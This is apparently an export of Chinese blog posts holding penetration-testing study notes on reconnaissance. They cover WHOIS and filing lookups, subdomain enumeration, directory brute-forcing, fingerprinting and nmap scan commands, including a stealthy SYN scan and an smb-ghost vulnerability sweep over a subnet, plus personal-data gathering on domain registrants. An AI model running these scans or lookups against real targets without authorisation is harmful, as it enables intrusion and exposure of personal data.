name）又称网域，是由一串用点分隔的名字组成的Internet上某一台或计算机组的名称，用于在数据传输时对计算机的定位标识。</p><p>由于IP地址具有不方便记忆、不能显示地址组织的名称和性质等缺点，设计出了域名，并通过网域名称系统（domain name system，DNS）来将域名和IP地址相互映射，使得访问互联网更方便。</p><p><strong>域名分类</strong></p><p>顶级域名：.com</p><p>二级域名：baidu.com</p><p>三级域名：<a href="http://www.baidu.com/">www.baidu.com</a></p><p>政府域名：.gov</p><p>商业域名：.com</p><p>教育域名：.edu</p><p><strong>Whois</strong></p><p>Whois是用来查询域名的IP和所有者信息的传输协议，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息（域名归属者的联系方式、注册和到期时间等）的数据库。</p><p>Whois通常使用TCP协议43端口，每个域名&#x2F;IP的whois信息由对应的管理机构保存，Whois查询关注的重点是注册商、注册人、注册人联系电话、邮件、DNS解析服务器。</p><p>Whois查询的重要性：通过whois查询可以获得域名注册者邮箱地址等信息，一般情况下对于中小型网站，域名注册者就是网站管理员，利用搜索引擎对whois查询到的信息进行搜索，可以获取更多域名注册者的个人信息。</p><p>相关实验：&lt;Whois网络注册信息探测&gt;：<a href="https://www.hetianlab.com/expc.do?ec=66a18063-8287-4b7c-9dfd-97faf52282f1">https://www.hetianlab.com/expc.do?ec=66a18063-8287-4b7c-9dfd-97faf52282f1</a></p><p><strong>备案信息</strong></p><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，是国家信息产业部对网站的一种管理途径，为了防止在网上从事非法网站经营活动。备案号是网站是否合法注册经营的标志，可随时在国家工业和信息化部网站备案系统上查询该ICP备案的详细信息。</p><p><strong>子域名</strong></p><p>子域名（subdomain）是在域名系统等级中，属于更高一层域的域。比如mail.heetian.com和bbs.heetian.com是heetian.com的子域，heetian.com是顶级域.com的子域。</p><p>相关实验：&lt;<a href="https://www.hetianlab.com/expc.do?ec=ECID2ee2-d187-4b59-8995-ac5b8158539f">AWVS 10.5 子域名扫描、盲注、结果比较</a>&gt;</p><p>为什么要查询网站的子域名？</p><p>1）了解竞争对手网站的业务动向；</p><p>2）渗透测试时进行旁注：通过检测哪些子域名存在安全风险，从而判断能否进一步影响到主机的安全。</p><h2 id="实验目的-2"><a href="#实验目的-2" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过实验学习Whois网络注册信息探测的目的和技术方法，了解备案信息在信息收集过程中的重要性，掌握子域名挖掘的常用方式。</p><h2 id="实验环境-2"><a href="#实验环境-2" class="headerlink" title="实验环境"></a>实验环境</h2><p>无特殊要求，能访问互联网即可。</p><h2 id="实验步骤一-2"><a href="#实验步骤一-2" class="headerlink" title="实验步骤一"></a>实验步骤一</h2><p><strong>任务描述：Whois查询hetianlab.com的注册信息。</strong></p><p>使用第三方网站查询</p><p><a href="https://whois.aliyun.com/">https://whois.aliyun.com</a> （中国万网&#x2F;阿里云）</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821110925519.png" alt="image-20230821110925519"></p><p><a href="http://whois.chinaz.com/">http://whois.chinaz.com</a> （站长工具）</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>kali自带whois的查询工具</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><h2 id="实验步骤二-2"><a href="#实验步骤二-2" class="headerlink" title="实验步骤二"></a>实验步骤二</h2><p><strong>任务描述：备案信息查询。</strong></p><p>备案信息查询主要关注的是单位信息，如名称、备案编号、网站负责人、法人、电子邮箱、联系电话等。</p><p>使用第三方网站查询</p><p><a href="http://www.beianbeian.com/">http://www.beianbeian.com</a>（ICP备案查询网）</p><p><a href="https://www.tianyancha.com/">https://www.tianyancha.com</a> （天眼查）</p><p>备案号反查，目的是了解目标主体公司下有哪些资产，便于我们确定范围。</p><p>如合天网安实验室的备案号反查结果：</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><h2 id="实验步骤三-1"><a href="#实验步骤三-1" class="headerlink" title="实验步骤三"></a>实验步骤三</h2><p><strong>任务描述：子域名收集，分为被动子域枚举和主动子域枚举。</strong></p><p><strong>被动子域枚举</strong>：收集子域信息的过程不会产生任何流量，<em><strong>目的是要隐身且留下很少或没有足迹。</strong></em></p><ol><li><p>证书透明度：证书透明度日志通过设计包含了由参与的CA针对任何给定域颁发的所有证书，SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。这些日志是公开的，这使得它们成为攻击者的信息宝库。通过查看证书透明度日志，攻击者可以收集有关组织基础结构的大量信息。</p><p><a href="https://crt.sh/">https://crt.sh</a></p></li><li><p>使用搜索引擎</p><p>Bing：发现子域名：site:target.com；过滤掉-site:<a href="http://www.hetianlab.com/">www.hetianlab.com</a></p></li><li><p>使用DNS聚合器</p><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com</a></p><p>可以为给定域查找潜在的大量子域，有一个非官方的Python库来提取数据。</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li></ol><p><strong>主动子域枚举：</strong>攻击者通过探测目标组织管理的基础结构来收集子域信息，主动枚举会产生检测可能导致的流量。</p><ol><li><p>Subbrute：根据DNS记录查询子域名，旨在创建最快、最准确的子域枚举工具。使用开放式解析器作为代理来规避DNS速率限制，该设计还提供了一层匿名性，不会将流量直接发送到目标的名称服务器。地址：<a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a></p><p><em><strong>但是速度太慢了</strong></em></p></li></ol><h1 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h1><h2 id="预备知识-1"><a href="#预备知识-1" class="headerlink" title="预备知识"></a>预备知识</h2><p><strong>路径信息</strong></p><p>路径信息收集&#x2F;目录扫描可以让我们发现这个网站存在多少个目录，多少个页面，探索出网站的整体结构，通过目录扫描我们还可以获取敏感文件、后台文件、数据库文件等。</p><p><strong>指纹信息</strong></p><p>攻击者<em><strong>最常用</strong></em>的方法是覆盖目标网络存在并枚举尽可能多的信息，以便制定出准确的攻击方案，有效利用目标主机正在使用的软件类型&#x2F;版本中的漏洞。指纹识别的目的是知道当前资产的一些基本情况，可以根据不同的指纹进行对应的测试，提升测试效率。在发起攻击之前我们需要了解某一程序特征、弱点或是历史存在的缺陷，有利于对目标进行快速了解。</p><p>相关实验：&lt;<a href="https://www.hetianlab.com/expc.do?ec=ECID8c3b-a997-48f1-a59b-70259fe9b2ec">python爬虫-WEB目录爆破和指纹识别</a>&gt;</p><p><strong>CMS信息</strong></p><p>CMS是content management system的缩写，意为‘内容管理系统’，很多网站为了简单和快速地部署服务，会使用别人开发好的CMS进行网站搭建。网站CMS查询可以帮助我们快速地定义使用的CMS，只要爆出漏洞的话影响的就是很多个站点。</p><p>相关课程：《<a href="https://www.hetianlab.com/cour.do?w=1&c=CCIDead9-9369-4950-8c61-7430fed27d23">CMS安全实践</a>》</p><p><strong>WAF信息</strong></p><p>WAF全称Web Application Firewall，中文名是Web应用防护系统，也称网站应用级入侵防御系统，是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略，来专门为Web应用提供保护的一款产品。</p><p>相关实验：&lt;<a href="https://www.hetianlab.com/expc.do?ec=ECIDee9320adea6e062017110811103300001">WAF渗透攻防实践</a>&gt;</p><p><strong>SSL信息</strong></p><p>HTTPS服务器需要正确的配置来提供有效的加密方式，保护用户不受MITM攻击（man-in-the-MiddleAttack，中间人攻击）或者密码分析。一些SSL协议的实现和设计上的漏洞已经被发现了，我们需要对HTTPS进行检查。</p><h2 id="实验目的-3"><a href="#实验目的-3" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过实验了解网站的路径信息、指纹信息、敏感文件的收集方式，查询网站的CMS类型及版本，学会WAF识别和对HTTPS进行检查。</p><h2 id="实验步骤一-3"><a href="#实验步骤一-3" class="headerlink" title="实验步骤一"></a>实验步骤一</h2><p><strong>任务描述：路径信息收集。</strong></p><ol><li><p>7kbscan-WebPathBrute</p><p>Web路径暴力探测工具,地址：<a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821131347513.png" alt="image-20230821131347513"></p></li><li><p>dirsearch</p><p>一个简单的命令行工具，旨在暴力破解网站中的目录和文件，地址：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p><p><img src="D:\hexo\source_posts\渗透\实验.assets\image-20230821134706590.png" alt="image-20230821134706590"></p></li></ol><h2 id="实验步骤二-3"><a href="#实验步骤二-3" class="headerlink" title="实验步骤二"></a>实验步骤二</h2><p><strong>任务描述：敏感文件探测。</strong></p><ol><li><p>利用搜索引擎</p><p>site:xxx.com filetype:xls</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230821134951298.png" alt="image-20230821134951298"></p></li><li><p>WEB-INF&#x2F;web.xml</p><p>WEB-INF是Java的Web应用安全目录，如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行映射。</p></li><li><p>FileScan</p></li></ol><p>   敏感文件扫描，地址：<a href="https://github.com/Mosuan/FileScan">https://github.com/Mosuan/FileScan</a></p><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.png" alt="headImg"></p><h2 id="实验步骤三-2"><a href="#实验步骤三-2" class="headerlink" title="实验步骤三"></a>实验步骤三</h2><p><strong>任务描述：指纹信息收集。</strong></p><ol><li><p>第三方网站</p><p><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a> （云悉指纹）</p><p><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a> （潮汐指纹）</p><p>推荐使用：潮汐指纹</p></li><li><p>服务器ssh配置ssh_scan</p><p>SSH配置和策略扫描程序，地址：<a href="https://github.com/mozilla/ssh_scan">https://github.com/mozilla/ssh_scan</a></p></li><li><p>w12scan</p><p>一款网络资产发现引擎，通过Web接口下发任务，会自动将相关的资产聚合在一起方便分析使用。地址：<a href="https://github.com/w-digital-scanner/w12scan">https://github.com/w-digital-scanner/w12scan</a></p><p>使用参考：<a href="https://www.bugku.com/thread-3810-1-1.html">https://www.bugku.com/thread-3810-1-1.html</a></p></li></ol><h2 id="实验步骤四"><a href="#实验步骤四" class="headerlink" title="实验步骤四"></a>实验步骤四</h2><p><strong>任务描述：CMS信息查询。</strong></p><ol><li><p>第三方网站</p><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a> （在线CMS指纹识别）</p><p>但是报错502也就是说对方的服务器出现了问题</p></li><li><p>CMS-Exploit-Framework</p><p>一款CMS漏洞利用框架，通过它可以很容易地获取、开发CMS漏洞利用插件，并对目标应用进行测试。地址：<a href="https://github.com/Q2h1Cg/CMS-Exploit-Framework">https://github.com/Q2h1Cg/CMS-Exploit-Framework</a></p><p>CMS识别：</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p></li></ol><h2 id="实验步骤五"><a href="#实验步骤五" class="headerlink" title="实验步骤五"></a>实验步骤五</h2><p><strong>任务描述：WAF识别。</strong></p><ol><li><p>wafw00f</p><p>一个Web应用防火墙（WAF）指纹识别工具，地址：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>工作原理：首先发送正常的HTTP请求并分析响应，如果不成功，将发送多个HTTP请求（可能是恶意的），并使用简单的逻辑来推断出它是哪个WAF。如果还是不成功，将分析先前返回的响应，并使用另一种简单的算法来猜测WAF或安全解决方案是否正在积极响应我们的攻击。</p></li></ol><h2 id="实验步骤六"><a href="#实验步骤六" class="headerlink" title="实验步骤六"></a>实验步骤六</h2><p><strong>任务描述：其他信息收集。</strong></p><ol><li><p>sslscan</p><p>sslscan是kali自带的工具，能够基于服务器的安全通信来分析服务器的配置文件。</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>这一部分告诉了我们服务器的一些配置信息，包括常见的配置错误：不支持TLS Fallback SCSV（信令套件，可以用来阻止客户端和服务器之间的意外降级，预防中间人攻击）、支持安全会话重新协商、禁止压缩、没有心脏滴血漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>这一部分告诉我们服务器支持的加密算法，以及服务器首选的加密算法，红色代表不安全的算法，黄色代表中等强度的算法。</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/headImg.action" alt="img"></p><p>这一部分告诉我们证书签名的一些信息，这里用的是2048位的RSA进行签名。</p></li><li><p>Kali中还有另一个工具sslyze也可以从SSL&#x2F;TLS获取加密信息的攻击，并且有时会提供额外信息给攻击者；SSL&#x2F;TLS信息也可以通过openssl命令获得。</p></li></ol><h1 id="GET显错注入"><a href="#GET显错注入" class="headerlink" title="GET显错注入"></a>GET显错注入</h1><h2 id="预备知识-2"><a href="#预备知识-2" class="headerlink" title="预备知识"></a>预备知识</h2><p>SQL 注入是一种攻击方式，在这种攻击方式中，恶意代码被插入到字符串中，然后将该字符串传递到 SQL Server 的实例以进行分析和执行。任何构成 SQL 语句的过程都应进行注入漏洞检查，因为 SQL Server 将执行其接收到的所有语法有效的查询。一个有经验的、坚定的攻击者甚至可以操作参数化数据。</p><p>SQL 注入的主要形式包括直接将代码插入到与 SQL 命令串联在一起并使其得以执行的用户输入变量。一种间接的攻击会将恶意代码注入要在表中存储或作为元数据存储的字符串。在存储的字符串随后串连到一个动态 SQL 命令中时，将执行该恶意代码。</p><p>注入过程的工作方式是提前终止文本字符串，然后追加一个新的命令。由于插入的命令可能在执行前追加其他字符串，<strong>因此攻击者将用注释标记“–”来终止注入的字符串</strong>。执行时，此后的文本将被忽略。</p><h2 id="实验目的-4"><a href="#实验目的-4" class="headerlink" title="实验目的"></a>实验目的</h2><p>通过本实验掌握最基本的GET显错注入及GET方式盲注，理解盲注的判断点；了解POST传送工具的使用并根据显错信息来设定注入语句；了解HTTP的信息头并学会通过修改信息头来实现注入；使用base64进行编码解码；学会浏览查看修改cookie。</p><h2 id="实验环境-3"><a href="#实验环境-3" class="headerlink" title="实验环境"></a>实验环境</h2><p>服务器：windows2003，IP地址：10.1.1.10</p><p>客户端：winXP，IP地址随机分配</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2023/08/20/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2023/08/20/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="前期信息收集"><a href="#前期信息收集" class="headerlink" title="前期信息收集"></a>前期信息收集</h2><h3 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h3><ol><li><p>域名简绍</p><p><strong>域名</strong>（Domain Name），简称域名、网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。<br><strong>DNS</strong>（域名系统，Domain Name System）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p></li><li><p>域名的分类</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/image-20230820204819127.png" alt="image-20230820204819127"></p></li><li><p>whois</p><p>是用来查询&#x3D;&#x3D;域名的IP&#x3D;&#x3D;以及&#x3D;&#x3D;所有者&#x3D;&#x3D;等的信息的传输协议</p><p>Whois 简单来说，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域<br>名注册商、域名注册日期和过期日期等）。通过域名 Whois 服务器查询，可以查询域名归属者联系方式，以及注册<br>和到期时间</p><p>对于中小型的服务器的管理者看可能使用自己的信息作为服务器的登录密码</p><p>下面就是使用<a href="https://whois.chinaz.com/">域名Whois查询 - 站长之家 (chinaz.com)</a>查询的结果</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230820205648295.png" alt="image-20230820205648295"></p></li><li><p>whois反查</p><ul><li><p>方式</p><blockquote><p>（1）根据已知域名反查，分析出此&#x3D;&#x3D;域名的注册人、邮箱、电话&#x3D;&#x3D;等字段；  </p><p>（2）根据已知域名WHOIS中的&#x3D;&#x3D;注册邮箱&#x3D;&#x3D;来反查得出其它域名WHOIS中注册&#x3D;&#x3D;邮箱与此相同的域名列表&#x3D;&#x3D;；  </p><p>（3）根据已知域名WHOIS中的&#x3D;&#x3D;注册人&#x3D;&#x3D;来反查得出其它域名WHOIS中&#x3D;&#x3D;注册人与此相同的域名列表&#x3D;&#x3D;；  </p></blockquote></li><li><p>缺点</p><p>很多公司都是DNS解析的运行商注册的，查到的是运行商代替个人和公司注册的网站信息</p></li><li><p>可以通过下面的网站进行反查</p><p> 域名反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=0">https://whois.chinaz.com/reverse?ddlSearchMode=0</a>  </p><p>邮箱反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=1">https://whois.chinaz.com/reverse?ddlSearchMode=1</a>  </p><p>注册人反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=2">https://whois.chinaz.com/reverse?ddlSearchMode=2</a>  电话反查：<a href="https://whois.chinaz.com/reverse?ddlSearchMode=3">https://whois.chinaz.com/reverse?ddlSearchMode=3</a></p></li></ul></li><li><p>备案信息</p><p>备案号是网站是否合法注册经营的标志，可以用网页的备案号反查出该公司旗下的资产。  </p></li><li><p>子域名</p><ul><li><p>谷歌高级搜索语法</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230820214327217.png" alt="image-20230820214327217"></p><p>常见的语法总结</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230820220114134.png" alt="image-20230820220114134"></p></li></ul></li><li><p>ssl证书查询</p><p>  <a href="https://crt.sh/">https://crt.sh/</a>  </p></li><li><p>子域名得的收集工具</p><ol start="11"><li>SubFinder + KSubdomain + HttpX</li></ol><p>  <strong>SubFinder</strong>：用来查询域名的子域名信息的工具，可以使用很多国外安全网站的api接口进行自动化搜索子域名信  息。  </p><p>  <a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subﬁnder</a>  <strong>HttpX</strong>：一款运行速度极快的多功能HTTP安全工具，它可以使用retryablehttp库来运行多种网络探针，并使用了多  线程机制来维持运行的稳定性和结果的准确性。  </p><p>  <a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a>  </p><p>  <strong>ksubdomain</strong>是一款基于无状态子域名爆破工具，支持在Windows&#x2F;Linux&#x2F;Mac上使用，它会很快的进行DNS爆破，  在Mac和Windows上理论最大发包速度在30w&#x2F;s,linux上为160w&#x2F;s的速度。  <a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a>  </p><blockquote><p>  <em>#subfinder</em>基本使用  </p><p>  .&#x2F;subfinder  -d baidu.com -o output.txt  </p><p>  <em>#ksubdomain</em>基本使用  </p><p>  .&#x2F;ksubdomain  -d baidu.com  </p><p> *#*管道操作  </p><p>  .&#x2F;subfinder  -d baidu.com -silent|.&#x2F;ksubdomain -verify -silent|.&#x2F;httpx -title  -content-length -status-  code  </p><p> <em>#<em>可以用管道结合在一起配合工作。达到收集域名，验证域名，</em>http</em>验证存活目的。  </p></blockquote><p>&#x3D;&#x3D;通过管道符的完成三个工具的整合&#x3D;&#x3D;</p></li></ol><h3 id="IP，端口信息的收集"><a href="#IP，端口信息的收集" class="headerlink" title="IP，端口信息的收集"></a>IP，端口信息的收集</h3><p>  <strong>CDN</strong>即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载  均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率  </p><ol><li><p>IP反差域名</p><blockquote><p>  <a href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a>  </p></blockquote></li><li><p>域名查询IP</p><blockquote><p>  <a href="http://ip.tool.chinaz.com/">http://ip.tool.chinaz.com/</a>  </p></blockquote></li><li><p>多地ping</p><blockquote><p>  <a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a>  </p></blockquote></li><li><p>国外ping</p><blockquote><p>  <a href="https://ping.eu/ping/">https://ping.eu/ping/</a>  </p></blockquote><p>可以进行绕过的CDN的限制</p></li><li><p>渗透端口</p><blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/8833316.html">https://www.cnblogs.com/bmjoker/p/8833316.html</a></p></blockquote></li><li><p>端口扫描</p><p>使用nmap工具进行扫描</p><p>基础的使用方法是</p><p>linux</p><blockquote><p>nmap -A -T4 IP地址</p></blockquote><p>windows</p><blockquote><p>nmap.exe -A -T4 IP地址</p></blockquote><p>&#x3D;&#x3D;注意必须在执行文件的目录下使用，或者将其添加到path&#x3D;&#x3D;</p><p>参数的意义</p><blockquote><p>  <strong>A</strong>：全面扫描\综合扫描  T4：扫描速度，共有6级，T0-T5  </p></blockquote><p>其他说明</p><blockquote><p>  不加端口说明扫描默认端口，1-1024 + nmap-service  （nmap觉得的危险端口）</p><p>  单一主机扫描：nmap 192.168.1.2  </p><p>  子网扫描：nmap 192.168.1.1&#x2F;24  </p><p>  多主机扫描：nmap 192.168.1.1 192.168.1.10  </p><p>  主机范围扫描：nmap 192.168.1.1-100  </p><p>  IP地址列表扫描：nmap –iL target.txt  </p><p>  扫描除指定IP外的所有子网主机：  </p><p>  nmap 192.168.1.1&#x2F;24 –exclude  192.168.1.1  </p><p>  扫描除文件中IP外的子网主机：  </p><p>  nmap 192.168.1.1&#x2F;24 –excludefile  xxx.txt  </p><p>  扫描特定主机上的80,21,23端口：  </p><p>nmap –p 80,21,23 192.168.1.1</p></blockquote><p>扫描全部端口</p><blockquote><p>  nmap -sS -v -T4  -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt  </p><ul><li><p>-sS：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高（一个完整的tcp连接需要3次握手，  而-sS选项不需要3次握手）  </p></li><li><p>优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描  攻击），扫描速度快，效率高，在工作中使用频率最高  缺点：它需要root&#x2F;administrator权限执行  </p></li><li><p>-Pn：扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描  </p></li><li><p>-iL：导入需要扫描的列表</p></li></ul></blockquote><p>扫描常见的的端口信息</p><blockquote><p>  nmap -sS  -T4 -Pn -oG TopTCP -iL LiveHosts.txt  </p><p>  系统扫描  </p><p>  nmap -O  -T4 -Pn -oG OSDetect -iL LiveHosts.txt  </p><p>  版本检测  </p><p>  nmap -sV  -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt  </p></blockquote><p>nmap还可以进行简单的漏洞扫描</p><blockquote><p>nmap.exe -p445 -v –script smb-ghost 192.168.1.0&#x2F;24</p></blockquote></li></ol><h3 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h3><ol><li><p>通过ping返回的TTL值判断是什么系统的服务器</p><p>linux TTL一般小于100</p><p>win一般大于100</p></li><li><p>CMS</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网络协议基础</title>
    <link href="/2023/08/19/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/08/19/%E6%B8%97%E9%80%8F/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="网络协议基础"><a href="#网络协议基础" class="headerlink" title="网络协议基础"></a>网络协议基础</h1><h2 id="网络分层协议"><a href="#网络分层协议" class="headerlink" title="网络分层协议"></a>网络分层协议</h2><h3 id="网络协议分层"><a href="#网络协议分层" class="headerlink" title="网络协议分层"></a>网络协议分层</h3><ul><li>应用层</li><li>传输层</li><li>网络层</li><li>数据链路层</li><li>物理层</li></ul><h4 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h4><ol><li><p>我们直接能够接触到的，我们的手机我们的电脑使用的软件就是在引用层</p></li><li><p>应用层只需要专注于为用户提供应用功能，不去关心数据是如何传播的就类似于，我们寄快递的时候，只需要把包裹交给快递员，由他负责运输快递，我们不需要关心快递是如何被运输的。而且应用层是工作在操作系统中的用户态，传输层及以下则工作在内核态</p></li></ol><h4 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h4><ol><li><p>有两个协议TCP（Transmission Control Protocol）和UDP</p></li><li><p>大部分应用使用的正是 TCP传输层协议，比如 HTTP 应用层协议。</p></li><li><p><strong>TCP</strong>保证了数据能可靠的传输给对方。应用需要传输的数据可能会非常大，如果直接传输就不好控制，因此当传输层的数据包大小超过MSS（TCP 最大报文段长度） ，就要将数据包分块，这样即使中途有一个分块丢失或损坏了，只需要重新发送这一个分块，而不用重新发送整个数据包。在 TCP 协议中，我们把每个分块称为一个<br>TCP段（TCP Segment）</p></li><li><p><strong>UDP</strong>只是简单的发送不会保证对方是否接受到</p></li><li><p>当设备作为接收方时，传输层则要负责把数据包传给应用，但是一台设备上可能会有很多应用在接收或者传输数据，因此需要用一个编号将应用区分开来，这个编号就是<strong>端口</strong>。比如80端口通常是Web服务器用的，22端口通常是SSH远程登录服务器用的。而对于浏览器（客户端）中的每个标签栏都是一个独立的进程，操作系统会为这些进程分配临时的端口号。<br>由于传输层的报文中会携带端口号，因此接收方可以识别出该报文是发送给哪个应用。</p><p>说白了就是用于区分不同的信息有不同的去处</p></li></ol><h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ol><li><p>网络层并不负责将数据从一个设备传输到另一个设备</p></li><li><p>只需要服务好应用即可，让其作为应用间数据传输的媒介，帮助实现应用到应用的通信，而实际的传输功能就交给下一层，也就是<br>网络层（InternetLayer）</p></li><li><p>网络层最常使用的IP协议</p><p>IP 协议会将传输层的报文作为数据部分，再加上IP 包头组装成 IP 报文，如果 IP 报文大小超过 MTU（以太网中一般为 1500 字节）就会再次进行分片，得到一个即将发送到网络的 IP 报文。</p></li><li><p>为了查询地址方便，需要将IP地址分成两种意义</p><ul><li>网络号：标识网络号是属于哪个子网</li><li>主机号：标识同一个子网下的不同的主机</li></ul><p>怎么分的呢？这需要配合<strong>子网掩码</strong>才能算出 IP 地址 的网络号和主机号。那么在寻址的过程中，先匹<br>配到相同的网络号，才会去找对应的主机。<br>除了寻址能力， IP 